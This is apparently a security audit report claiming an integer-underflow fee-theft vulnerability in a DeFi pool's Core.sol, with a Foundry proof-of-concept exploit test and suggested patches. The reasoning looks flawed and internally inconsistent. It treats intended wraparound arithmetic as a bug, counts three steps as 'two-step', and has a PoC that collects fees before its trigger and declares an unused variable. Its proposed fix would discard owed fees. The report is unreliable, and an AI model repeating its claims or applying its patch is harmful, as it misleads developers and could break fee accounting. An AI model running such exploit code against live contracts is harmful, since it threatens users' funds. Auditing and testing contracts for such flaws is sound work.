## Title
Integer Underflow in Position Fee Tracking Allows Unlimited Fee Theft via Liquidity Manipulation

## Summary
The `updatePosition` function in `Core.sol` calculates a new `feesPerLiquidityInsideLast` snapshot using unchecked subtraction that can underflow when a user drastically reduces position liquidity. This causes the snapshot to wrap to a massive value near `type(uint256).max`, and subsequent fee calculations using this corrupted snapshot yield astronomically inflated fees, allowing attackers to steal far more tokens than the pool contains.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/Core.sol` (lines 430-438) and `src/types/feesPerLiquidity.sol` (lines 13-18)

**Intended Logic:** When a position's liquidity is updated, the protocol should:
1. Calculate fees owed with the current liquidity
2. Update to the new liquidity amount
3. Adjust the `feesPerLiquidityInsideLast` snapshot to account for fees just calculated [1](#0-0) 

**Actual Logic:** The snapshot adjustment uses unchecked subtraction that underflows when removing significant liquidity: [2](#0-1) 

The formula `feesPerLiquidityInside - feesPerLiquidityFromAmounts(fees, liquidityNext)` underflows when:
- `feesPerLiquidityFromAmounts(fees, liquidityNext) > feesPerLiquidityInside`

This occurs because `feesPerLiquidityFromAmounts` recalculates the fees in per-liquidity terms using the NEW (smaller) liquidity: [3](#0-2) 

**Mathematical Breakdown:**
```
fees = (feesPerLiquidityInside - feesPerLiquidityInsideLast) * liquidityOld >> 128
feesPerLiquidity = (fees << 128) / liquidityNew
newSnapshot = feesPerLiquidityInside - feesPerLiquidity
```

Substituting:
```
newSnapshot = feesPerLiquidityInside - [((delta * liquidityOld) >> 128) << 128] / liquidityNew
            = feesPerLiquidityInside - (delta * liquidityOld) / liquidityNew
```

When `liquidityNew << liquidityOld`, the term `(delta * liquidityOld) / liquidityNew` becomes much larger than `feesPerLiquidityInside`, causing underflow.

**Exploitation Path:**
1. **Setup**: Attacker creates a position with large liquidity (e.g., 1,000,000 units) in tick range
2. **Accumulation**: Wait for pool swaps to accumulate fees; `feesPerLiquidityInside` increases by some delta
3. **Trigger Underflow**: Call `updatePosition` with `liquidityDelta = -999,999`, reducing liquidity to just 1 unit
   - Fees calculated: `fees = delta * 1,000,000 / 2^128`
   - Converted back: `feesPerLiquidity = (fees * 2^128) / 1 = delta * 1,000,000`
   - New snapshot: `feesPerLiquidityInsideLast = feesPerLiquidityInside - (delta * 1,000,000)`
   - **Result**: Underflows to `type(uint256).max - (delta * 1,000,000 - feesPerLiquidityInside)`
4. **Exploit**: Call `collectFees` or add liquidity back
   - Difference: `feesPerLiquidityInside - type(uint256).max + ...` wraps to massive positive value
   - Calculated fees: `(massive_difference * liquidity) >> 128` = astronomical amount
5. **Theft**: Attacker withdraws inflated fees, draining pool reserves far beyond legitimate fees

**Security Property Broken:** 
- **Fee Accounting Invariant**: "Position fee collection must be accurate and never allow double-claiming"
- **Solvency Invariant**: Pool balances can be drained below legitimate amounts

## Impact Explanation
- **Affected Assets**: All tokens in any pool where an attacker has a position
- **Damage Severity**: Attacker can extract **unlimited fees** - the wrapped-around difference can be 100,000x or more than actual accumulated fees. Since fees are capped at uint128 but the intermediate calculation uses uint256, the attacker can drain entire pool reserves across multiple transactions.
- **User Impact**: All liquidity providers in the affected pool lose their deposited tokens. Other users' positions become unwithdrawable if pool reserves are depleted. [4](#0-3) 

Note the comment at line 27-28 acknowledges overflow but assumes it "will never exceed type(uint128).max" - this assumption is violated by the underflow vulnerability.

## Likelihood Explanation
- **Attacker Profile**: Any liquidity provider who can create and modify positions
- **Preconditions**: 
  - Pool must be initialized with some liquidity
  - Minimal fee accumulation needed (even 0.01% of position value is sufficient)
  - Attacker needs capital to create initial large position
- **Execution Complexity**: Simple two-step attack:
  1. Create large position, wait briefly for any fees
  2. Remove 99.9%+ of liquidity via `updatePosition`
  3. Collect inflated fees
- **Frequency**: Exploitable repeatedly on the same position across multiple blocks. Each pool is independently vulnerable.

## Recommendation

**Fix**: Add overflow check before the subtraction in `Core.sol`:

```solidity
// In src/Core.sol, function updatePosition, lines 436-437:

// CURRENT (vulnerable):
position.feesPerLiquidityInsideLast =
    feesPerLiquidityInside.sub(feesPerLiquidityFromAmounts(fees0, fees1, liquidityNext));

// FIXED:
FeesPerLiquidity memory feesDelta = feesPerLiquidityFromAmounts(fees0, fees1, liquidityNext);
// Prevent underflow by ensuring we don't subtract more than the current value
if (feesDelta.value0 > feesPerLiquidityInside.value0 || feesDelta.value1 > feesPerLiquidityInside.value1) {
    // Reset to current value if fees adjustment would underflow
    position.feesPerLiquidityInsideLast = feesPerLiquidityInside;
} else {
    position.feesPerLiquidityInsideLast = feesPerLiquidityInside.sub(feesDelta);
}
```

**Alternative Mitigation**: Implement checked arithmetic in the `sub` function:

```solidity
// In src/types/feesPerLiquidity.sol, function sub:

function sub(FeesPerLiquidity memory a, FeesPerLiquidity memory b) pure returns (FeesPerLiquidity memory result) {
    // Use checked subtraction instead of unchecked assembly
    result.value0 = a.value0 - b.value0;  // Will revert on underflow in Solidity 0.8+
    result.value1 = a.value1 - b.value1;
}
```

## Proof of Concept

```solidity
// File: test/Exploit_FeeUnderflow.t.sol
// Run with: forge test --match-test test_FeeTheftViaLiquidityUnderflow -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./FullTest.sol";
import {MIN_TICK, MAX_TICK} from "../src/math/constants.sol";
import {CoreLib} from "../src/libraries/CoreLib.sol";
import {RouteNode, TokenAmount} from "../src/Router.sol";

contract Exploit_FeeUnderflow is FullTest {
    using CoreLib for *;

    function test_FeeTheftViaLiquidityUnderflow() public {
        // SETUP: Create pool and position with large liquidity
        PoolKey memory poolKey = createPool(0, 1 << 63, 100, byteToCallPoints(0));
        
        // Attacker deposits large position
        token0.approve(address(positions), type(uint256).max);
        token1.approve(address(positions), type(uint256).max);
        
        uint128 initialLiquidity = 1_000_000 * 1e18;
        (uint256 posId, uint128 liquidity,,) = positions.mintAndDeposit(
            poolKey, -1000, 1000, 
            type(uint128).max, type(uint128).max, 
            0
        );
        
        console.log("Initial liquidity:", liquidity);
        
        // Generate some fees by doing a swap
        token0.approve(address(router), type(uint256).max);
        router.swap(
            RouteNode({poolKey: poolKey, sqrtRatioLimit: SqrtRatio.wrap(0), skipAhead: 0}),
            TokenAmount({token: address(token0), amount: 1e18}),
            0,
            address(this)
        );
        
        // Check fees before exploit
        (uint128 feesBefore0, uint128 feesBefore1) = positions.collectFees(
            posId, poolKey, -1000, 1000, address(this)
        );
        console.log("Legitimate fees0:", feesBefore0);
        console.log("Legitimate fees1:", feesBefore1);
        
        // EXPLOIT: Remove 99.9999% of liquidity to trigger underflow
        uint128 liquidityToRemove = liquidity - 1;
        positions.withdraw(posId, poolKey, -1000, 1000, liquidityToRemove);
        
        // Small swap to advance feesPerLiquidityInside slightly
        router.swap(
            RouteNode({poolKey: poolKey, sqrtRatioLimit: SqrtRatio.wrap(0), skipAhead: 0}),
            TokenAmount({token: address(token0), amount: 1e15}),
            0,
            address(this)
        );
        
        // VERIFY: Collect massively inflated fees
        (uint128 exploitFees0, uint128 exploitFees1) = positions.collectFees(
            posId, poolKey, -1000, 1000, address(this)
        );
        
        console.log("Exploit fees0:", exploitFees0);
        console.log("Exploit fees1:", exploitFees1);
        
        // Fees should be astronomically larger than legitimate
        assertGt(exploitFees0, feesBefore0 * 1000, "Exploit fees should be inflated by 1000x+");
    }
}
```

## Notes

This vulnerability arises from the intersection of three design choices:
1. **Unchecked assembly arithmetic** in the `sub` function to support wraparound for normal fee accumulation
2. **Fee recalculation** using new liquidity amount when the snapshot is updated
3. **No bounds checking** on the magnitude of the subtraction

The intended wraparound behavior (to handle global fee accumulation overflow) conflicts with the actual usage pattern where fees are converted between total amounts and per-liquidity representation at different liquidity scales.

The vulnerability is particularly severe because:
- The underflow magnitude scales with the ratio `liquidityOld / liquidityNew`
- Removing 99.99% of liquidity (keeping 0.01%) creates a 10,000x multiplier
- This multiplier applies to ALL accumulated fees in the pool, not just the attacker's share
- The exploit is repeatable and can drain pools completely over multiple transactions

### Citations

**File:** src/Core.sol (L430-438)
```text
            if (liquidityNext == 0) {
                position.liquidity = 0;
                position.feesPerLiquidityInsideLast = FeesPerLiquidity(0, 0);
            } else {
                (uint128 fees0, uint128 fees1) = position.fees(feesPerLiquidityInside);
                position.liquidity = liquidityNext;
                position.feesPerLiquidityInsideLast =
                    feesPerLiquidityInside.sub(feesPerLiquidityFromAmounts(fees0, fees1, liquidityNext));
            }
```

**File:** src/types/feesPerLiquidity.sol (L13-18)
```text
function sub(FeesPerLiquidity memory a, FeesPerLiquidity memory b) pure returns (FeesPerLiquidity memory result) {
    assembly ("memory-safe") {
        mstore(result, sub(mload(a), mload(b)))
        mstore(add(result, 32), sub(mload(add(a, 32)), mload(add(b, 32))))
    }
}
```

**File:** src/types/feesPerLiquidity.sol (L20-28)
```text
function feesPerLiquidityFromAmounts(uint128 amount0, uint128 amount1, uint128 liquidity)
    pure
    returns (FeesPerLiquidity memory result)
{
    assembly ("memory-safe") {
        mstore(result, div(shl(128, amount0), liquidity))
        mstore(add(result, 32), div(shl(128, amount1), liquidity))
    }
}
```

**File:** src/types/position.sol (L33-51)
```text
function fees(Position memory position, FeesPerLiquidity memory feesPerLiquidityInside)
    pure
    returns (uint128, uint128)
{
    uint128 liquidity;
    uint256 difference0;
    uint256 difference1;
    assembly ("memory-safe") {
        liquidity := mload(add(position, 0x20))
        // feesPerLiquidityInsideLast is now at offset 0x40 due to extraData field
        let positionFpl := mload(add(position, 0x40))
        difference0 := sub(mload(feesPerLiquidityInside), mload(positionFpl))
        difference1 := sub(mload(add(feesPerLiquidityInside, 0x20)), mload(add(positionFpl, 0x20)))
    }

    return (
        uint128(FixedPointMathLib.fullMulDivN(difference0, liquidity, 128)),
        uint128(FixedPointMathLib.fullMulDivN(difference1, liquidity, 128))
    );
```
